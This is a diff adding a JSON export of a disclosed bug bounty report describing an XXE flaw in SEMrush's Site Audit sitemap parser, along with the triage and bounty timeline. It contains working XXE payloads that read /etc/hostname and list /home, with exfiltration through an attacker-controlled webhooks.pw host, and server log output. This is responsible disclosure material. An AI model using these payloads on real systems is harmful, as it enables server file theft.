@@ -1,0 +1,400 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-02-14T14:44:49.554Z", 
+    "voters": [
+        "achapman", 
+        "jokebookservice1", 
+        "michiel", 
+        "secator", 
+        "jr0ch17", 
+        "spam404", 
+        "hunter", 
+        "ramsexy", 
+        "cdl", 
+        "teknogeek", 
+        "and 74 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "2000.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 312543, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-03-13T14:24:37.450Z", 
+    "vulnerability_information": "**Summary:** \nThe Project Site Audit function is vulnerable to XXE when parsing sitemap.xml files.\n\n**Description:** \nThe Site Audit function spiders a given website and performs analysis on the discovered pages. In order to improve website spidering the URL of a `sitemap.xml` file can be provided. If provided, the `sitemap.xml` file will be downloaded and processed by a Java XML processor.\n\nThe Java xml processor used is vulnerable to XXE attacks. By providing an external document type declaration (DTD) the XML processor can be coerced into processing external entities, for example:\n\n**sitemap.xml**\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n <!DOCTYPE foo [  \n   <!ELEMENT foo ANY >\n   <!ENTITY xxe SYSTEM \"http://xxe.webhooks.pw/text.txt\" >]>\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\" \n   xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n   xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\">\n    <url>\n        <loc>&xxe;</loc>\n        <lastmod>2006-11-18</lastmod>\n        <changefreq>daily</changefreq>\n        <priority>0.8</priority>\n    </url>\n</urlset>\n```\nWill cause the XML processor to process the external entity at http://xxe.webhooks.pw/text.txt:\n```\n\"\u2588\u2588\u2588\" - - [05/Feb/2018:13:12:26 +0000] \"GET /text.txt HTTP/1.1\" 302 - \"-\" \"Java/1.8.0_144\"\n```\n\nThis issue can be abused to read arbitrary files and list directory contents from the filesystem of the XML processor application. See the supporting materials below for an example of reading the `/etc/hostname` file and listing the contents of the `/home` directory.\n\n## Browsers Verified In:\n\n* Firefox 58.0.1 (64-bit)\n* Google Chrome 63.0.3239.132 (64-bit)\n\n## Steps To Reproduce:\n\n  1. Create a new project with the domain hosting the malicious `sitemap.xml` file, e.g. `semrush.webhooks.pw`\n  2. Set up a new \"Site Audit\"\n  3. Within \"Site Audit Settings\" change \"Crawl Source\" to \"Enter sitemap URL\" and add the url of the malicious `sitemap.xml` file. An example `sitemap.xml`, e.g. http://static.webhooks.pw/files/semrush_sitemap.xml.\n  4. Start the \"Site Audit\"\n  5. The \"Site Audit\" background process will then kick off, download the provided sitemap.xml file and process it, triggering the XXE vulnerability.\n\nSee the attached screen capture for an example of exploiting this issue. Note, this screen capture is approximately 1 minute long.\n\n## Supporting Material/References:\n### File reading\n**sitemap.xml**\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE urlset [\n <!ENTITY % goodies SYSTEM \"file:///etc/hostname\">\n <!ENTITY % dtd SYSTEM \"http://dtd.webhooks.pw/files/combine.dtd\">\n%dtd;\n]>\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\" \n   xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n   xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\">\n    <url>\n        <loc>http://location.webhooks.pw/resp/&xxe;</loc>\n        <lastmod>2006-11-18</lastmod>\n        <changefreq>daily</changefreq>\n        <priority>0.8</priority>\n    </url>\n</urlset>\n```\n**combine.dtd**\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!ENTITY xxe \"%goodies;\">\n```\n\n**Output:**\n```\n\"46.229.173.66\" - - [05/Feb/2018:14:26:02 +0000] \"GET /resp/\u2588\u2588\u2588\u2588\u2588\u2588\u2588 HTTP/1.1\" 302 - \"-\" \"Mozilla/5.0 (compatible; SemrushBot-SA/0.97; +http://www.semrush.com/bot.html)\"\n---\n\nDecoded:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n```\n\n### Directory listing\n**sitemap.xml**\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE urlset [\n <!ENTITY % goodies SYSTEM \"file:///home/\">\n <!ENTITY % dtd SYSTEM \"http://dtd.webhooks.pw/files/combine.dtd\">\n%dtd;\n]>\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\" \n   xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n   xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\">\n    <url>\n        <loc>http://location.webhooks.pw/resp/&xxe;</loc>\n        <lastmod>2006-11-18</lastmod>\n        <changefreq>daily</changefreq>\n        <priority>0.8</priority>\n    </url>\n</urlset>\n```\n**combine.dtd**\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!ENTITY xxe \"%goodies;\">\n```\n\n**Output:**\n```\n\"46.229.173.66\" - - [05/Feb/2018:14:39:35 +0000] \"GET /resp/\u2588\u2588\u2588\u2588\u2588\u2588 HTTP/1.1\" 302 - \"-\" \"Mozilla/5.0 (compatible; SemrushBot-SA/0.97; +http://www.semrush.com/bot.html)\"\n---\n\nDecoded:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\ncdh\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nlost found\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n```\n\n## Impact\n\nThis issue could be abused to identify and list the contents of sensitive files on the Semrush server which implements the Site Audit functionality.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "critical", 
+        "author_type": "Team"
+    }, 
+    "title": "XXE in Site Audit function exposing file and directory contents", 
+    "is_member_of_team?": null, 
+    "vote_count": 84, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2018-03-16T14:44:49.674Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$2,000", 
+    "attachments": [
+        {
+            "file_name": "semrush_xxe3.gif", 
+            "type": "image/gif", 
+            "id": 260389, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/260/389/a21e56349160c2da6a2fdc002cf319ac998dfe74/semrush_xxe3.gif?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222613Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4c50928c499a2caa306ce6fdb5a68107ba6c0fb84148a9689980339418df425f"
+        }
+    ], 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-06T11:46:05.150Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-06T11:46:05.150Z", 
+            "actor": {
+                "username": "alla", 
+                "url": "/alla", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "message": "Thanks for the report, we will investigate this.", 
+            "markdown_message": "<p>Thanks for the report, we will investigate this.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2355405, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-06T17:05:35.250Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-06T17:05:35.250Z", 
+            "actor": {
+                "username": "alla", 
+                "url": "/alla", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugTriaged", 
+            "id": 2356071, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-07T09:48:21.651Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-07T09:48:21.651Z", 
+            "actor": {
+                "username": "alla", 
+                "url": "/alla", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "message": "Could you please check the fix?", 
+            "markdown_message": "<p>Could you please check the fix?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2358235, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-07T10:54:42.562Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-07T10:54:42.562Z", 
+            "actor": {
+                "username": "achapman", 
+                "url": "/achapman", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/141/831/6adeb914bf93c8aa16971dd83df80e3d6a2fb325_medium.jpg?1518021841"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "message": "Hi Alla,\n\nI've retested this issue and can no longer reproduce the vulnerability. The fix looks good.\n\nThanks for the quick turnaround!", 
+            "markdown_message": "<p>Hi Alla,</p>\n\n<p>I&#39;ve retested this issue and can no longer reproduce the vulnerability. The fix looks good.</p>\n\n<p>Thanks for the quick turnaround!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2358376, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "achapman", 
+                "url": "/achapman"
+            }, 
+            "created_at": "2018-02-07T11:13:33.564Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-07T11:13:33.564Z", 
+            "actor": {
+                "username": "alla", 
+                "url": "/alla", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 2358394, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2018-02-14T14:41:14.932Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-14T14:41:14.932Z", 
+            "actor": {
+                "url": "/semrush", 
+                "profile": {
+                    "name": "SEMrush"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/966/9b01ecc388e5d9d64b3b532dd5db41b02323e9dc_medium.png?1477497046"
+                }
+            }, 
+            "team_handle": "semrush", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "2000.0", 
+            "collaborator": {
+                "username": "achapman", 
+                "url": "/achapman"
+            }, 
+            "message": "Thanks for making our service safer!", 
+            "markdown_message": "<p>Thanks for making our service safer!</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 2382529, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-14T14:41:24.235Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-14T14:41:24.235Z", 
+            "actor": {
+                "username": "sergin", 
+                "url": "/sergin", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Critical", 
+                "old_severity": "High"
+            }, 
+            "team_handle": "semrush", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 2382531, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-14T14:44:31.453Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-14T14:44:31.453Z", 
+            "actor": {
+                "username": "achapman", 
+                "url": "/achapman", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/141/831/6adeb914bf93c8aa16971dd83df80e3d6a2fb325_medium.jpg?1518021841"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "message": "Thanks team, appreciate the quick turn around on this!", 
+            "markdown_message": "<p>Thanks team, appreciate the quick turn around on this!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2382552, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-14T14:44:49.594Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-14T14:44:49.594Z", 
+            "actor": {
+                "username": "achapman", 
+                "url": "/achapman", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/141/831/6adeb914bf93c8aa16971dd83df80e3d6a2fb325_medium.jpg?1518021841"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "first_to_agree": true, 
+            "message": "Any objections to disclosure?", 
+            "markdown_message": "<p>Any objections to disclosure?</p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2382554, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-13T14:24:37.495Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-13T14:24:37.495Z", 
+            "actor": {
+                "username": "sergin", 
+                "url": "/sergin", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "message": "This is what we are looking for here on HackerOne!)", 
+            "markdown_message": "<p>This is what we are looking for here on HackerOne!)</p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2488113, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-13T14:24:37.620Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-13T14:24:37.620Z", 
+            "actor": {
+                "username": "sergin", 
+                "url": "/sergin", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "semrush", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 2488114, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "achapman", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/achapman", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/141/831/973640fc2b68a752c0f46e923c4c4443e0e99c74_small.jpg?1518021841"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 54, 
+        "name": "XML External Entities (XXE)"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -22923683.590266626, 
+    "disclosed_at": "2018-03-13T14:24:37.574Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/312543", 
+    "created_at": "2018-02-05T15:10:15.336Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p><strong>Summary:</strong> <br>\nThe Project Site Audit function is vulnerable to XXE when parsing sitemap.xml files.</p>\n\n<p><strong>Description:</strong> <br>\nThe Site Audit function spiders a given website and performs analysis on the discovered pages. In order to improve website spidering the URL of a <code>sitemap.xml</code> file can be provided. If provided, the <code>sitemap.xml</code> file will be downloaded and processed by a Java XML processor.</p>\n\n<p>The Java xml processor used is vulnerable to XXE attacks. By providing an external document type declaration (DTD) the XML processor can be coerced into processing external entities, for example:</p>\n\n<p><strong>sitemap.xml</strong></p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>\n <span class=\"cp\">&lt;!DOCTYPE foo [  \n   &lt;!ELEMENT foo ANY &gt;</span>\n   <span class=\"cp\">&lt;!ENTITY xxe SYSTEM &quot;http://xxe.webhooks.pw/text.txt&quot; &gt;</span>]&gt;\n<span class=\"nt\">&lt;urlset</span> <span class=\"na\">xmlns=</span><span class=\"s\">&quot;http://www.sitemaps.org/schemas/sitemap/0.9&quot;</span> \n   <span class=\"na\">xmlns:xsi=</span><span class=\"s\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>\n   <span class=\"na\">xsi:schemaLocation=</span><span class=\"s\">&quot;http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd&quot;</span><span class=\"nt\">&gt;</span>\n    <span class=\"nt\">&lt;url&gt;</span>\n        <span class=\"nt\">&lt;loc&gt;</span><span class=\"ni\">&amp;xxe;</span><span class=\"nt\">&lt;/loc&gt;</span>\n        <span class=\"nt\">&lt;lastmod&gt;</span>2006-11-18<span class=\"nt\">&lt;/lastmod&gt;</span>\n        <span class=\"nt\">&lt;changefreq&gt;</span>daily<span class=\"nt\">&lt;/changefreq&gt;</span>\n        <span class=\"nt\">&lt;priority&gt;</span>0.8<span class=\"nt\">&lt;/priority&gt;</span>\n    <span class=\"nt\">&lt;/url&gt;</span>\n<span class=\"nt\">&lt;/urlset&gt;</span>\n</code></pre>\n<p>Will cause the XML processor to process the external entity at <a title=\"http://xxe.webhooks.pw/text.txt:\" href=\"/redirect?signature=2df8708304aa9a3ee2a99bb5ad8e2e52b201ca03&amp;url=http%3A%2F%2Fxxe.webhooks.pw%2Ftext.txt%3A\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://xxe.webhooks.pw/text.txt:</span><i class=\"icon-external-link\"></i></a></p>\n<pre class=\"highlight plaintext\"><code>&quot;\u2588\u2588\u2588&quot; - - [05/Feb/2018:13:12:26 +0000] &quot;GET /text.txt HTTP/1.1&quot; 302 - &quot;-&quot; &quot;Java/1.8.0_144&quot;\n</code></pre>\n<p>This issue can be abused to read arbitrary files and list directory contents from the filesystem of the XML processor application. See the supporting materials below for an example of reading the <code>/etc/hostname</code> file and listing the contents of the <code>/home</code> directory.</p>\n\n<h2 id=\"browsers-verified-in\">Browsers Verified In:</h2>\n\n<ul>\n<li>Firefox 58.0.1 (64-bit)</li>\n<li>Google Chrome 63.0.3239.132 (64-bit)</li>\n</ul>\n\n<h2 id=\"steps-to-reproduce\">Steps To Reproduce:</h2>\n\n<ol>\n<li>Create a new project with the domain hosting the malicious <code>sitemap.xml</code> file, e.g. <code>semrush.webhooks.pw</code>\n</li>\n<li>Set up a new &quot;Site Audit&quot;</li>\n<li>Within &quot;Site Audit Settings&quot; change &quot;Crawl Source&quot; to &quot;Enter sitemap URL&quot; and add the url of the malicious <code>sitemap.xml</code> file. An example <code>sitemap.xml</code>, e.g. <a title=\"http://static.webhooks.pw/files/semrush_sitemap.xml\" href=\"/redirect?signature=d3c566ec9842a07c8bda527178e5702df031dd0a&amp;url=http%3A%2F%2Fstatic.webhooks.pw%2Ffiles%2Fsemrush_sitemap.xml\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://static.webhooks.pw/files/semrush_sitemap.xml</span><i class=\"icon-external-link\"></i></a>.</li>\n<li>Start the &quot;Site Audit&quot;</li>\n<li>The &quot;Site Audit&quot; background process will then kick off, download the provided sitemap.xml file and process it, triggering the XXE vulnerability.</li>\n</ol>\n\n<p>See the attached screen capture for an example of exploiting this issue. Note, this screen capture is approximately 1 minute long.</p>\n\n<h2 id=\"supporting-material-references\">Supporting Material/References:</h2>\n\n<h3 id=\"file-reading\">File reading</h3>\n\n<p><strong>sitemap.xml</strong></p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>\n<span class=\"cp\">&lt;!DOCTYPE urlset [\n &lt;!ENTITY % goodies SYSTEM &quot;file:///etc/hostname&quot;&gt;</span>\n <span class=\"cp\">&lt;!ENTITY % dtd SYSTEM &quot;http://dtd.webhooks.pw/files/combine.dtd&quot;&gt;</span>\n%dtd;\n]&gt;\n<span class=\"nt\">&lt;urlset</span> <span class=\"na\">xmlns=</span><span class=\"s\">&quot;http://www.sitemaps.org/schemas/sitemap/0.9&quot;</span> \n   <span class=\"na\">xmlns:xsi=</span><span class=\"s\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>\n   <span class=\"na\">xsi:schemaLocation=</span><span class=\"s\">&quot;http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd&quot;</span><span class=\"nt\">&gt;</span>\n    <span class=\"nt\">&lt;url&gt;</span>\n        <span class=\"nt\">&lt;loc&gt;</span>http://location.webhooks.pw/resp/<span class=\"ni\">&amp;xxe;</span><span class=\"nt\">&lt;/loc&gt;</span>\n        <span class=\"nt\">&lt;lastmod&gt;</span>2006-11-18<span class=\"nt\">&lt;/lastmod&gt;</span>\n        <span class=\"nt\">&lt;changefreq&gt;</span>daily<span class=\"nt\">&lt;/changefreq&gt;</span>\n        <span class=\"nt\">&lt;priority&gt;</span>0.8<span class=\"nt\">&lt;/priority&gt;</span>\n    <span class=\"nt\">&lt;/url&gt;</span>\n<span class=\"nt\">&lt;/urlset&gt;</span>\n</code></pre>\n<p><strong>combine.dtd</strong></p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>\n<span class=\"cp\">&lt;!ENTITY xxe &quot;%goodies;&quot;&gt;</span>\n</code></pre>\n<p><strong>Output:</strong></p>\n<pre class=\"highlight plaintext\"><code>&quot;46.229.173.66&quot; - - [05/Feb/2018:14:26:02 +0000] &quot;GET /resp/\u2588\u2588\u2588\u2588\u2588\u2588\u2588 HTTP/1.1&quot; 302 - &quot;-&quot; &quot;Mozilla/5.0 (compatible; SemrushBot-SA/0.97; +http://www.semrush.com/bot.html)&quot;\n---\n\nDecoded:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n</code></pre>\n<h3 id=\"directory-listing\">Directory listing</h3>\n\n<p><strong>sitemap.xml</strong></p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>\n<span class=\"cp\">&lt;!DOCTYPE urlset [\n &lt;!ENTITY % goodies SYSTEM &quot;file:///home/&quot;&gt;</span>\n <span class=\"cp\">&lt;!ENTITY % dtd SYSTEM &quot;http://dtd.webhooks.pw/files/combine.dtd&quot;&gt;</span>\n%dtd;\n]&gt;\n<span class=\"nt\">&lt;urlset</span> <span class=\"na\">xmlns=</span><span class=\"s\">&quot;http://www.sitemaps.org/schemas/sitemap/0.9&quot;</span> \n   <span class=\"na\">xmlns:xsi=</span><span class=\"s\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>\n   <span class=\"na\">xsi:schemaLocation=</span><span class=\"s\">&quot;http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd&quot;</span><span class=\"nt\">&gt;</span>\n    <span class=\"nt\">&lt;url&gt;</span>\n        <span class=\"nt\">&lt;loc&gt;</span>http://location.webhooks.pw/resp/<span class=\"ni\">&amp;xxe;</span><span class=\"nt\">&lt;/loc&gt;</span>\n        <span class=\"nt\">&lt;lastmod&gt;</span>2006-11-18<span class=\"nt\">&lt;/lastmod&gt;</span>\n        <span class=\"nt\">&lt;changefreq&gt;</span>daily<span class=\"nt\">&lt;/changefreq&gt;</span>\n        <span class=\"nt\">&lt;priority&gt;</span>0.8<span class=\"nt\">&lt;/priority&gt;</span>\n    <span class=\"nt\">&lt;/url&gt;</span>\n<span class=\"nt\">&lt;/urlset&gt;</span>\n</code></pre>\n<p><strong>combine.dtd</strong></p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>\n<span class=\"cp\">&lt;!ENTITY xxe &quot;%goodies;&quot;&gt;</span>\n</code></pre>\n<p><strong>Output:</strong></p>\n<pre class=\"highlight plaintext\"><code>&quot;46.229.173.66&quot; - - [05/Feb/2018:14:39:35 +0000] &quot;GET /resp/\u2588\u2588\u2588\u2588\u2588\u2588 HTTP/1.1&quot; 302 - &quot;-&quot; &quot;Mozilla/5.0 (compatible; SemrushBot-SA/0.97; +http://www.semrush.com/bot.html)&quot;\n---\n\nDecoded:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\ncdh\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nlost 